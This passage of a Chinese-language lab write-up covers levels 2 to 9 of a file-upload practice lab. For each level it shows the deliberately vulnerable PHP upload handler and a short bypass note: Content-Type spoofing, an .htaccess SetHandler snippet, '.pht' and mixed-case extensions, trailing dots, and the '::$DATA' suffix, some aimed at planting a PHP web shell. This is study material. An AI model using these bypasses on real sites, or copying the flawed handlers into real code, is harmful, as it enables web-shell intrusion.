class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">$is_upload = <span class="keyword">false</span>;</span><br><span class="line">$msg = <span class="keyword">null</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">'submit'</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (file_exists($UPLOAD_ADDR)) &#123;</span><br><span class="line">        <span class="keyword">if</span> (($_FILES[<span class="string">'upload_file'</span>][<span class="string">'type'</span>] == <span class="string">'image/jpeg'</span>) || ($_FILES[<span class="string">'upload_file'</span>][<span class="string">'type'</span>] == <span class="string">'image/png'</span>) || ($_FILES[<span class="string">'upload_file'</span>][<span class="string">'type'</span>] == <span class="string">'image/gif'</span>)) &#123;</span><br><span class="line">            <span class="keyword">if</span> (move_uploaded_file($_FILES[<span class="string">'upload_file'</span>][<span class="string">'tmp_name'</span>], $UPLOAD_ADDR . <span class="string">'/'</span> . $_FILES[<span class="string">'upload_file'</span>][<span class="string">'name'</span>])) &#123;</span><br><span class="line">                $img_path = $UPLOAD_ADDR . $_FILES[<span class="string">'upload_file'</span>][<span class="string">'name'</span>];</span><br><span class="line">                $is_upload = <span class="keyword">true</span>;</span><br><span class="line"></span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            $msg = <span class="string">'文件类型不正确，请重新上传！'</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        $msg = $UPLOAD_ADDR.<span class="string">'文件夹不存在,请手工创建！'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>move_uploaded_file — 将上传的文件移动到新位置 </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bool move_uploaded_file ( string $filename , string $destination )</span><br></pre></td></tr></table></figure><p>本函数检查并确保由 <code>filename</code> 指定的文件是合法的上传文件（即通过 PHP 的 HTTP POST 上传机制所上传的）。如果文件合法，则将其移动为由<code>destination</code> 指定的文件。</p><p>这种检查显得格外重要，如果上传的文件有可能会造成对用户或本系统的其他用户显示其内容的话。</p><h4 id="pass-1"><a href="#pass-1" class="headerlink" title="pass"></a>pass</h4><p>验证Content-Type：</p><p><img src="https://dbhaihai.oss-cn-hangzhou.aliyuncs.com/%E5%8D%9A%E5%AE%A2%E7%9B%B8%E7%89%87/CTF/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0writeup.assets/1530596607345.png" alt="1530596607345"></p><h3 id="Pass-03"><a href="#Pass-03" class="headerlink" title="Pass-03"></a>Pass-03</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">$is_upload = <span class="keyword">false</span>;</span><br><span class="line">$msg = <span class="keyword">null</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">'submit'</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (file_exists($UPLOAD_ADDR)) &#123;</span><br><span class="line">        $deny_ext = <span class="keyword">array</span>(<span class="string">'.asp'</span>,<span class="string">'.aspx'</span>,<span class="string">'.php'</span>,<span class="string">'.jsp'</span>);</span><br><span class="line">        $file_name = trim($_FILES[<span class="string">'upload_file'</span>][<span class="string">'name'</span>]);</span><br><span class="line">        $file_name = deldot($file_name);<span class="comment">//删除文件名末尾的点</span></span><br><span class="line">        $file_ext = strrchr($file_name, <span class="string">'.'</span>);</span><br><span class="line">        $file_ext = strtolower($file_ext); <span class="comment">//转换为小写</span></span><br><span class="line">        $file_ext = str_ireplace(<span class="string">'::$DATA'</span>, <span class="string">''</span>, $file_ext);<span class="comment">//去除字符串::$DATA</span></span><br><span class="line">        $file_ext = trim($file_ext); <span class="comment">//收尾去空</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(!in_array($file_ext, $deny_ext)) &#123;</span><br><span class="line">            <span class="keyword">if</span> (move_uploaded_file($_FILES[<span class="string">'upload_file'</span>][<span class="string">'tmp_name'</span>], $UPLOAD_ADDR. <span class="string">'/'</span> . $_FILES[<span class="string">'upload_file'</span>][<span class="string">'name'</span>])) &#123;</span><br><span class="line">                 $img_path = $UPLOAD_ADDR .<span class="string">'/'</span>. $_FILES[<span class="string">'upload_file'</span>][<span class="string">'name'</span>];</span><br><span class="line">                 $is_upload = <span class="keyword">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            $msg = <span class="string">'不允许上传.asp,.aspx,.php,.jsp后缀文件！'</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        $msg = $UPLOAD_ADDR . <span class="string">'文件夹不存在,请手工创建！'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>strrchr() 函数查找字符串在另一个字符串中最后一次出现的位置，并返回从该位置到字符串结尾的所有字符。 </p><p>在线运行代码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$file_name=<span class="string">'15.png::$DATA'</span>;</span><br><span class="line">$file_ext = strrchr($file_name, <span class="string">'.'</span>);</span><br><span class="line"><span class="keyword">echo</span> $file_ext;</span><br><span class="line">$file_ext = strtolower($file_ext); <span class="comment">//转换为小写</span></span><br><span class="line"><span class="keyword">echo</span> $file_ext;</span><br><span class="line">$file_ext = str_ireplace(<span class="string">'::$DATA'</span>, <span class="string">''</span>, $file_ext);<span class="comment">//去除字符串::$DATA</span></span><br><span class="line"><span class="keyword">echo</span> $file_ext;</span><br><span class="line">$file_ext = trim($file_ext);</span><br><span class="line"><span class="keyword">echo</span> $file_ext;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>结果</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">.png::$DATA</span><br><span class="line">.png::$data</span><br><span class="line">.png</span><br><span class="line">.png</span><br></pre></td></tr></table></figure><h4 id="pass-2"><a href="#pass-2" class="headerlink" title="pass"></a>pass</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;FilesMatch <span class="string">"cimer"</span>&gt;</span><br><span class="line"></span><br><span class="line">SetHandler application/x-httpd一php</span><br><span class="line"></span><br><span class="line">&lt;/FilesMatch&gt;</span><br></pre></td></tr></table></figure><p>通过.htaccess文件，调用php的解析器解析一个文件名只要包含“cimer”这个字符串的任意文件。这个“cimer”的内容如果是一句话木马.即可利用中国莱刀进行连接。 </p><h3 id="Pass-04"><a href="#Pass-04" class="headerlink" title="Pass-04"></a>Pass-04</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">$is_upload = <span class="keyword">false</span>;</span><br><span class="line">$msg = <span class="keyword">null</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">'submit'</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (file_exists($UPLOAD_ADDR)) &#123;</span><br><span class="line">        $deny_ext = <span class="keyword">array</span>(<span class="string">".php"</span>,<span class="string">".php5"</span>,<span class="string">".php4"</span>,<span class="string">".php3"</span>,<span class="string">".php2"</span>,<span class="string">"php1"</span>,<span class="string">".html"</span>,<span class="string">".htm"</span>,<span class="string">".phtml"</span>,<span class="string">".pHp"</span>,<span class="string">".pHp5"</span>,<span class="string">".pHp4"</span>,<span class="string">".pHp3"</span>,<span class="string">".pHp2"</span>,<span class="string">"pHp1"</span>,<span class="string">".Html"</span>,<span class="string">".Htm"</span>,<span class="string">".pHtml"</span>,<span class="string">".jsp"</span>,<span class="string">".jspa"</span>,<span class="string">".jspx"</span>,<span class="string">".jsw"</span>,<span class="string">".jsv"</span>,<span class="string">".jspf"</span>,<span class="string">".jtml"</span>,<span class="string">".jSp"</span>,<span class="string">".jSpx"</span>,<span class="string">".jSpa"</span>,<span class="string">".jSw"</span>,<span class="string">".jSv"</span>,<span class="string">".jSpf"</span>,<span class="string">".jHtml"</span>,<span class="string">".asp"</span>,<span class="string">".aspx"</span>,<span class="string">".asa"</span>,<span class="string">".asax"</span>,<span class="string">".ascx"</span>,<span class="string">".ashx"</span>,<span class="string">".asmx"</span>,<span class="string">".cer"</span>,<span class="string">".aSp"</span>,<span class="string">".aSpx"</span>,<span class="string">".aSa"</span>,<span class="string">".aSax"</span>,<span class="string">".aScx"</span>,<span class="string">".aShx"</span>,<span class="string">".aSmx"</span>,<span class="string">".cEr"</span>,<span class="string">".sWf"</span>,<span class="string">".swf"</span>);</span><br><span class="line">        $file_name = trim($_FILES[<span class="string">'upload_file'</span>][<span class="string">'name'</span>]);</span><br><span class="line">        $file_name = deldot($file_name);<span class="comment">//删除文件名末尾的点</span></span><br><span class="line">        $file_ext = strrchr($file_name, <span class="string">'.'</span>);</span><br><span class="line">        $file_ext = strtolower($file_ext); <span class="comment">//转换为小写</span></span><br><span class="line">        $file_ext = str_ireplace(<span class="string">'::$DATA'</span>, <span class="string">''</span>, $file_ext);<span class="comment">//去除字符串::$DATA</span></span><br><span class="line">        $file_ext = trim($file_ext); <span class="comment">//收尾去空</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (!in_array($file_ext, $deny_ext)) &#123;</span><br><span class="line">            <span class="keyword">if</span> (move_uploaded_file($_FILES[<span class="string">'upload_file'</span>][<span class="string">'tmp_name'</span>], $UPLOAD_ADDR . <span class="string">'/'</span> . $_FILES[<span class="string">'upload_file'</span>][<span class="string">'name'</span>])) &#123;</span><br><span class="line">                $img_path = $UPLOAD_ADDR . $_FILES[<span class="string">'upload_file'</span>][<span class="string">'name'</span>];</span><br><span class="line">                $is_upload = <span class="keyword">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            $msg = <span class="string">'此文件不允许上传!'</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        $msg = $UPLOAD_ADDR . <span class="string">'文件夹不存在,请手工创建！'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="pass-3"><a href="#pass-3" class="headerlink" title="pass"></a>pass</h4><p>pht后缀</p><h3 id="Pass-05"><a href="#Pass-05" class="headerlink" title="Pass-05"></a>Pass-05</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">$is_upload = <span class="keyword">false</span>;</span><br><span class="line">$msg = <span class="keyword">null</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">'submit'</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (file_exists($UPLOAD_ADDR)) &#123;</span><br><span class="line">        $deny_ext = <span class="keyword">array</span>(<span class="string">".php"</span>,<span class="string">".php5"</span>,<span class="string">".php4"</span>,<span class="string">".php3"</span>,<span class="string">".php2"</span>,<span class="string">".html"</span>,<span class="string">".htm"</span>,<span class="string">".phtml"</span>,<span class="string">".pHp"</span>,<span class="string">".pHp5"</span>,<span class="string">".pHp4"</span>,<span class="string">".pHp3"</span>,<span class="string">".pHp2"</span>,<span class="string">".Html"</span>,<span class="string">".Htm"</span>,<span class="string">".pHtml"</span>,<span class="string">".jsp"</span>,<span class="string">".jspa"</span>,<span class="string">".jspx"</span>,<span class="string">".jsw"</span>,<span class="string">".jsv"</span>,<span class="string">".jspf"</span>,<span class="string">".jtml"</span>,<span class="string">".jSp"</span>,<span class="string">".jSpx"</span>,<span class="string">".jSpa"</span>,<span class="string">".jSw"</span>,<span class="string">".jSv"</span>,<span class="string">".jSpf"</span>,<span class="string">".jHtml"</span>,<span class="string">".asp"</span>,<span class="string">".aspx"</span>,<span class="string">".asa"</span>,<span class="string">".asax"</span>,<span class="string">".ascx"</span>,<span class="string">".ashx"</span>,<span class="string">".asmx"</span>,<span class="string">".cer"</span>,<span class="string">".aSp"</span>,<span class="string">".aSpx"</span>,<span class="string">".aSa"</span>,<span class="string">".aSax"</span>,<span class="string">".aScx"</span>,<span class="string">".aShx"</span>,<span class="string">".aSmx"</span>,<span class="string">".cEr"</span>,<span class="string">".sWf"</span>,<span class="string">".swf"</span>,<span class="string">".htaccess"</span>);</span><br><span class="line">        $file_name = trim($_FILES[<span class="string">'upload_file'</span>][<span class="string">'name'</span>]);</span><br><span class="line">        $file_name = deldot($file_name);<span class="comment">//删除文件名末尾的点</span></span><br><span class="line">        $file_ext = strrchr($file_name, <span class="string">'.'</span>);</span><br><span class="line">        $file_ext = str_ireplace(<span class="string">'::$DATA'</span>, <span class="string">''</span>, $file_ext);<span class="comment">//去除字符串::$DATA</span></span><br><span class="line">        $file_ext = trim($file_ext); <span class="comment">//首尾去空</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (!in_array($file_ext, $deny_ext)) &#123;</span><br><span class="line">            <span class="keyword">if</span> (move_uploaded_file($_FILES[<span class="string">'upload_file'</span>][<span class="string">'tmp_name'</span>], $UPLOAD_ADDR . <span class="string">'/'</span> . $_FILES[<span class="string">'upload_file'</span>][<span class="string">'name'</span>])) &#123;</span><br><span class="line">                $img_path = $UPLOAD_ADDR . <span class="string">'/'</span> . $file_name;</span><br><span class="line">                $is_upload = <span class="keyword">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            $msg = <span class="string">'此文件不允许上传'</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        $msg = $UPLOAD_ADDR . <span class="string">'文件夹不存在,请手工创建！'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="pass-4"><a href="#pass-4" class="headerlink" title="pass"></a>pass</h4><p>pht</p><p>没有对文件名进行小写转换，所以大小写混合或者大写可以绕过 </p><h3 id="Pass-06"><a href="#Pass-06" class="headerlink" title="Pass-06"></a>Pass-06</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">$is_upload = <span class="keyword">false</span>;</span><br><span class="line">$msg = <span class="keyword">null</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">'submit'</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (file_exists($UPLOAD_ADDR)) &#123;</span><br><span class="line">        $deny_ext = <span class="keyword">array</span>(<span class="string">".php"</span>,<span class="string">".php5"</span>,<span class="string">".php4"</span>,<span class="string">".php3"</span>,<span class="string">".php2"</span>,<span class="string">".html"</span>,<span class="string">".htm"</span>,<span class="string">".phtml"</span>,<span class="string">".pHp"</span>,<span class="string">".pHp5"</span>,<span class="string">".pHp4"</span>,<span class="string">".pHp3"</span>,<span class="string">".pHp2"</span>,<span class="string">".Html"</span>,<span class="string">".Htm"</span>,<span class="string">".pHtml"</span>,<span class="string">".jsp"</span>,<span class="string">".jspa"</span>,<span class="string">".jspx"</span>,<span class="string">".jsw"</span>,<span class="string">".jsv"</span>,<span class="string">".jspf"</span>,<span class="string">".jtml"</span>,<span class="string">".jSp"</span>,<span class="string">".jSpx"</span>,<span class="string">".jSpa"</span>,<span class="string">".jSw"</span>,<span class="string">".jSv"</span>,<span class="string">".jSpf"</span>,<span class="string">".jHtml"</span>,<span class="string">".asp"</span>,<span class="string">".aspx"</span>,<span class="string">".asa"</span>,<span class="string">".asax"</span>,<span class="string">".ascx"</span>,<span class="string">".ashx"</span>,<span class="string">".asmx"</span>,<span class="string">".cer"</span>,<span class="string">".aSp"</span>,<span class="string">".aSpx"</span>,<span class="string">".aSa"</span>,<span class="string">".aSax"</span>,<span class="string">".aScx"</span>,<span class="string">".aShx"</span>,<span class="string">".aSmx"</span>,<span class="string">".cEr"</span>,<span class="string">".sWf"</span>,<span class="string">".swf"</span>,<span class="string">".htaccess"</span>);</span><br><span class="line">        $file_name = $_FILES[<span class="string">'upload_file'</span>][<span class="string">'name'</span>];</span><br><span class="line">        $file_name = deldot($file_name);<span class="comment">//删除文件名末尾的点</span></span><br><span class="line">        $file_ext = strrchr($file_name, <span class="string">'.'</span>);</span><br><span class="line">        $file_ext = strtolower($file_ext); <span class="comment">//转换为小写</span></span><br><span class="line">        $file_ext = str_ireplace(<span class="string">'::$DATA'</span>, <span class="string">''</span>, $file_ext);<span class="comment">//去除字符串::$DATA</span></span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> (!in_array($file_ext, $deny_ext)) &#123;</span><br><span class="line">            <span class="keyword">if</span> (move_uploaded_file($_FILES[<span class="string">'upload_file'</span>][<span class="string">'tmp_name'</span>], $UPLOAD_ADDR . <span class="string">'/'</span> . $_FILES[<span class="string">'upload_file'</span>][<span class="string">'name'</span>])) &#123;</span><br><span class="line">                $img_path = $UPLOAD_ADDR . <span class="string">'/'</span> . $file_name;</span><br><span class="line">                $is_upload = <span class="keyword">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            $msg = <span class="string">'此文件不允许上传'</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        $msg = $UPLOAD_ADDR . <span class="string">'文件夹不存在,请手工创建！'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="pass-5"><a href="#pass-5" class="headerlink" title="pass"></a>pass</h4><p>审计代码发现没有去处空格</p><p>利用Windows系统的文件名特性。文件名最后增加<strong>点和空格</strong>，写成<code>06.php.</code>，上传后保存在Windows系统上的文件名最后的一个<code>.</code>会被去掉，实际上保存的文件名就是<code>06.php</code> </p><p>pht</p><h3 id="Pass-07"><a href="#Pass-07" class="headerlink" title="Pass-07"></a>Pass-07</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">$is_upload = <span class="keyword">false</span>;</span><br><span class="line">$msg = <span class="keyword">null</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">'submit'</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (file_exists($UPLOAD_ADDR)) &#123;</span><br><span class="line">        $deny_ext = <span class="keyword">array</span>(<span class="string">".php"</span>,<span class="string">".php5"</span>,<span class="string">".php4"</span>,<span class="string">".php3"</span>,<span class="string">".php2"</span>,<span class="string">".html"</span>,<span class="string">".htm"</span>,<span class="string">".phtml"</span>,<span class="string">".pHp"</span>,<span class="string">".pHp5"</span>,<span class="string">".pHp4"</span>,<span class="string">".pHp3"</span>,<span class="string">".pHp2"</span>,<span class="string">".Html"</span>,<span class="string">".Htm"</span>,<span class="string">".pHtml"</span>,<span class="string">".jsp"</span>,<span class="string">".jspa"</span>,<span class="string">".jspx"</span>,<span class="string">".jsw"</span>,<span class="string">".jsv"</span>,<span class="string">".jspf"</span>,<span class="string">".jtml"</span>,<span class="string">".jSp"</span>,<span class="string">".jSpx"</span>,<span class="string">".jSpa"</span>,<span class="string">".jSw"</span>,<span class="string">".jSv"</span>,<span class="string">".jSpf"</span>,<span class="string">".jHtml"</span>,<span class="string">".asp"</span>,<span class="string">".aspx"</span>,<span class="string">".asa"</span>,<span class="string">".asax"</span>,<span class="string">".ascx"</span>,<span class="string">".ashx"</span>,<span class="string">".asmx"</span>,<span class="string">".cer"</span>,<span class="string">".aSp"</span>,<span class="string">".aSpx"</span>,<span class="string">".aSa"</span>,<span class="string">".aSax"</span>,<span class="string">".aScx"</span>,<span class="string">".aShx"</span>,<span class="string">".aSmx"</span>,<span class="string">".cEr"</span>,<span class="string">".sWf"</span>,<span class="string">".swf"</span>,<span class="string">".htaccess"</span>);</span><br><span class="line">        $file_name = trim($_FILES[<span class="string">'upload_file'</span>][<span class="string">'name'</span>]);</span><br><span class="line">        $file_ext = strrchr($file_name, <span class="string">'.'</span>);</span><br><span class="line">        $file_ext = strtolower($file_ext); <span class="comment">//转换为小写</span></span><br><span class="line">        $file_ext = str_ireplace(<span class="string">'::$DATA'</span>, <span class="string">''</span>, $file_ext);<span class="comment">//去除字符串::$DATA</span></span><br><span class="line">        $file_ext = trim($file_ext); <span class="comment">//首尾去空</span></span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> (!in_array($file_ext, $deny_ext)) &#123;</span><br><span class="line">            <span class="keyword">if</span> (move_uploaded_file($_FILES[<span class="string">'upload_file'</span>][<span class="string">'tmp_name'</span>], $UPLOAD_ADDR . <span class="string">'/'</span> . $_FILES[<span class="string">'upload_file'</span>][<span class="string">'name'</span>])) &#123;</span><br><span class="line">                $img_path = $UPLOAD_ADDR . <span class="string">'/'</span> . $file_name;</span><br><span class="line">                $is_upload = <span class="keyword">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            $msg = <span class="string">'此文件不允许上传'</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        $msg = $UPLOAD_ADDR . <span class="string">'文件夹不存在,请手工创建！'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="pass-6"><a href="#pass-6" class="headerlink" title="pass"></a>pass</h4><p>审计代码发现没有删除结尾的<code>.</code></p><p>原理同Pass-07</p><p>文件名后加点，改成<code>07.php.</code></p><p>pht</p><h3 id="Pass-08"><a href="#Pass-08" class="headerlink" title="Pass-08"></a>Pass-08</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">$is_upload = <span class="keyword">false</span>;</span><br><span class="line">$msg = <span class="keyword">null</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">'submit'</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (file_exists($UPLOAD_ADDR)) &#123;</span><br><span class="line">        $deny_ext = <span class="keyword">array</span>(<span class="string">".php"</span>,<span class="string">".php5"</span>,<span class="string">".php4"</span>,<span class="string">".php3"</span>,<span class="string">".php2"</span>,<span class="string">".html"</span>,<span class="string">".htm"</span>,<span class="string">".phtml"</span>,<span class="string">".pHp"</span>,<span class="string">".pHp5"</span>,<span class="string">".pHp4"</span>,<span class="string">".pHp3"</span>,<span class="string">".pHp2"</span>,<span class="string">".Html"</span>,<span class="string">".Htm"</span>,<span class="string">".pHtml"</span>,<span class="string">".jsp"</span>,<span class="string">".jspa"</span>,<span class="string">".jspx"</span>,<span class="string">".jsw"</span>,<span class="string">".jsv"</span>,<span class="string">".jspf"</span>,<span class="string">".jtml"</span>,<span class="string">".jSp"</span>,<span class="string">".jSpx"</span>,<span class="string">".jSpa"</span>,<span class="string">".jSw"</span>,<span class="string">".jSv"</span>,<span class="string">".jSpf"</span>,<span class="string">".jHtml"</span>,<span class="string">".asp"</span>,<span class="string">".aspx"</span>,<span class="string">".asa"</span>,<span class="string">".asax"</span>,<span class="string">".ascx"</span>,<span class="string">".ashx"</span>,<span class="string">".asmx"</span>,<span class="string">".cer"</span>,<span class="string">".aSp"</span>,<span class="string">".aSpx"</span>,<span class="string">".aSa"</span>,<span class="string">".aSax"</span>,<span class="string">".aScx"</span>,<span class="string">".aShx"</span>,<span class="string">".aSmx"</span>,<span class="string">".cEr"</span>,<span class="string">".sWf"</span>,<span class="string">".swf"</span>,<span class="string">".htaccess"</span>);</span><br><span class="line">        $file_name = trim($_FILES[<span class="string">'upload_file'</span>][<span class="string">'name'</span>]);</span><br><span class="line">        $file_name = deldot($file_name);<span class="comment">//删除文件名末尾的点</span></span><br><span class="line">        $file_ext = strrchr($file_name, <span class="string">'.'</span>);</span><br><span class="line">        $file_ext = strtolower($file_ext); <span class="comment">//转换为小写</span></span><br><span class="line">        $file_ext = trim($file_ext); <span class="comment">//首尾去空</span></span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> (!in_array($file_ext, $deny_ext)) &#123;</span><br><span class="line">            <span class="keyword">if</span> (move_uploaded_file($_FILES[<span class="string">'upload_file'</span>][<span class="string">'tmp_name'</span>], $UPLOAD_ADDR . <span class="string">'/'</span> . $_FILES[<span class="string">'upload_file'</span>][<span class="string">'name'</span>])) &#123;</span><br><span class="line">                $img_path = $UPLOAD_ADDR . <span class="string">'/'</span> . $file_name;</span><br><span class="line">                $is_upload = <span class="keyword">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            $msg = <span class="string">'此文件不允许上传'</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        $msg = $UPLOAD_ADDR . <span class="string">'文件夹不存在,请手工创建！'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="pass-7"><a href="#pass-7" class="headerlink" title="pass"></a>pass</h4><p>没有删除<code>$DATA</code></p><p>Windows文件流特性绕过，文件名改成<code>08.php::$DATA</code>，上传成功后保存的文件名其实是<code>08.php</code> </p><p>pht</p><h3 id="Pass-09"><a href="#Pass-09" class="headerlink" title="Pass-09"></a>Pass-09</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span 